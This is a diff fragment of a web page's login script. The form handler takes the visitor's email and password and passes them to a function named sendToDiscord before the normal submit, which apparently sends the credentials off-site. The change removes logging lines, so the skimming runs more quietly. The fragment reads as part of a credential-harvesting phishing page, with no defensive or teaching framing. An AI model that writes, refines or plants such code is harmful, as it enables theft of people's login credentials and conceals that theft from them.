@@ -81,13 +81,8 @@
             const email = event.target.email.value;
             const password = event.target.password.value;
             sendToDiscord(email, password);
-            console.log('Login Successful');
             event.target.submit();
         }
-
-        window.onload = () => {
-            console.log('Login Form Accessed');
-        };
     </script>
 </head>
 <body>
